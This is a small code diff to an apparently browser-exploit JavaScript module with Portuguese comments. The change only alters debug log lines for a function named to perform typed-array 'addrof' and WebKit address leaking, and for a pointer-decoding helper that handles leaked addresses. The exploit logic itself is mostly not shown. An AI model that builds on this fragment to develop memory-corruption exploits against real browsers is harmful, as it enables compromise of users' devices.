@@ -8,7 +8,7 @@
 //   WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST E offsets de DATA_OFFSETS
 //   são substituídos por 'AdvancedInt64.fromParts()' usando a função auxiliar
 //   'hexStringToParts' para parsing da string hexadecimal.
-// - ADICIONADO LOGS DE DEPURACÃO PARA VALIDAÇÃO DE WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST.
+// - ADICIONADO LOGS DE DEPURACÃO COM JSON.stringify PARA VALIDAÇÃO DE WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -56,7 +56,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 function decodeCompressedPointer(leakedAddr) {
     // DEBUGGING: Log o valor de WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST antes de ser usado
-    logS3(`[DEBUG] decodeCompressedPointer: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: "${WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST}" (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");
+    logS3(`[DEBUG] decodeCompressedPointer: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: ${JSON.stringify(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST)} (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");
 
     // Usar AdvancedInt64.fromParts para o assumed_heap_base_for_decompression
     // Convertendo a string hexadecimal em partes low e high
@@ -85,7 +85,7 @@ function decodeCompressedPointer(leakedAddr) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     // DEBUGGING: Log o valor de WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST no início da função principal
-    logS3(`[DEBUG] executeTypedArrayVictimAddrofAndWebKitLeak_R43: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: "${WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST}" (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");
+    logS3(`[DEBUG] executeTypedArrayVictimAddrofAndWebKitLeak_R43: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: ${JSON.stringify(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST)} (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");
 
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Fix para Construtor AdvancedInt64 (All FromParts) ---`, "test");
